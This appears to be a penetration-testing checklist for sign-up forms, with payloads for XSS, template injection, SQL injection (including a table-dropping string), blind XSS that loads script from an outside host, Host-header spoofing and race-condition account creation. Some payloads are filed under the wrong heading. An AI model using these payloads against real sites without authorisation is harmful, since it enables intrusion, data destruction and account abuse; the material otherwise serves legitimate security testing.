### Sorted Checklist for Sign Up Vulnerabilities in Obsidian

This checklist is sorted by the potential vulnerability type and includes example payloads and additional notes.

#### General Vulnerability Categories

1. **Sensitive Information Disclosure**

   - **Existing Email Address Reflection:**
     - Payload: `email=existing@gmail.com`
     - Note: Check for authorization tokens or other sensitive information reflected in the response.

   - **Company Email Address Reflection:**
     - Payload: `email=admin@company.com`
     - Note: Check if this grants extra authorities or functionalities.

   - **Company Email Address Variations:**
     - Payloads: `admin@company.com (with space)`, `admin@COMPANY.COM`, `admin@gmail.com@company.com`, `me+(@gmail.com)@company.com`, `"me@gmail.com"@company.com`, `<me@gmail.com>"@company.com`, `"me@gmail.com;"@company.com`, `"me@gmail.com+"@company.com`
     - Note: Test these variations for potential access control bypass or sensitive information disclosure.

   - **Large String Injection:**
     - Payload: Inject large strings (50,000+ characters) into POST parameters.
     - Note: Monitor for errors, which may reveal sensitive information.

2. **Cross-Site Scripting (XSS)**

   - Payloads:
     - `me+(<script>alert(0)</script>)@gmail.com`
     - `me(<script>alert(0)</script>)@gmail.com`
     - `me@gmail(<script>alert(0)</script>).com`
     - `"<script>alert(0)</script>"@gmail.com`
     - `"<%= 7 * 7 %>"@gmail.com` (for SSTI)
     - `me+(${{7*7}})@gmail.com` (for SSTI)
     - `"' OR 1=1 -- '"@gmail.com` (for SQLi)
     - `"me); DROP TABLE users;--"@gmail.com` (for SQLi)
     - `%@gmail.com`
   - Note: Test these payloads in email addresses, usernames, first/last names, and password fields.

3. **Server-Side Template Injection (SSTI)**

   - Payloads:
     - `{{7*7}}, {7*7}, ${{7*7}}`
     - `<script src=//me.xss.ht></script>`
     - `<img src="//me.xss.ht">`
     - `<%` (to check for reflection in email body)
     - `<%= 7 * 7 %>` (for SSTI if `<%` is reflected)
   - Note: Test these payloads in first name, last name, and username fields.

4. **Blind XSS**

   - Payloads:
     - `"><script src=//me.xss.ht></script>`
     - `<img src="//me.xss.ht">`
   - Note: Test in first/last names, password fields, and user-agent headers.

5. **SQL Injection (SQLi)**

   - Payloads:
     - `' AND '1' = '2 OR`
     - `";WAITFOR DELAY '0.0.20'--`
   - Note: Test these payloads in email addresses, usernames, first/last names, and user-agent headers.

6. **Command Injection**

   - Payload:
     - `email=me@whoami.id.collaborator.net`
   - Note: Use Burp Collaborator and monitor for back-end information or internal IPs.

7. **Authentication Bypass**

   - **Company Email Address:**
     - Payload: `admin@company.com`
     - Note: Try accessing all endpoints without verifying the account.

   - **Spoofing Host Header:**
     - Payload: `X-Forwarded-Host: me.com`
     - Note: Test this if the company accepts the company email but doesn't activate the account.

8. **Brute Force**

   - Payload:
     - `email=me@gmail.com&password=********`
   - Note: Use brute force tools to create multiple accounts or enumerate email addresses.

9. **Race Conditions**

   - Payload:
     - `email=m&password=********&Invitation=Random` (for invitation-based signup)
   - Note: Use automation to create multiple accounts with a single invitation.

10. **Mobile-Number Verification**

    - Note: If the site uses mobile verification, investigate OTP expiration, response manipulation, and UUID tampering.

11. **CSRF**

    - Note: If no CSRF token or protection is present, attempt to craft a CSRF PoC.

12. **Hidden Character Injection**

    - Payload:
      - `bob%00 or %01bob`
    - Note: Inject invisible range characters (%00 to %FF) into usernames or emails.

13. **Time-Based SQLi**

    - Payload:
      - `";WAITFOR DELAY '0.0.20'--`
    - Note: Test this in X-Forwarded-For header.

14. **Other Checks**

    - **Birthday Field Manipulation:** Test setting birthdays to today or tomorrow for potential birthday discounts.

    - **Password Field Manipulation:**
      - Payload: `%01%E2%80%AEalert%0D%0A`
      - Note: Check for behavior if using only `%01`, logging in without CRLF, and if trela is accepted instead of alert.

    - **True/Null/Undefined Values:** Test these values in usernames and other fields for potential errors.

15. **Account Recovery/Deletion:**

    - Payload: Use the email address associated with a previously deleted account for sign up.
    - Note: Attempt to recover data from the deleted account.

16. **User-Agent Manipulation:**

    - Payload:
      - Inject SQLi payloads or blind XSS payloads in the user-agent header.
    - Note: Test this to see if the user-agent header is processed insecurely.

#### Important Notes

- **Use Burp Suite:** Use Burp Suite for intercepting requests and responses, creating payloads, and setting up TLS Pass Through for Google reCAPTCHA bypass.
- **Collaborator Server:** Leverage Burp Collaborator for detecting back-end information, internal IPs, and blind XSS.
- **Security Best Practices:** Always follow security best practices and consult with your organization's security team before testing these techniques on production systems.
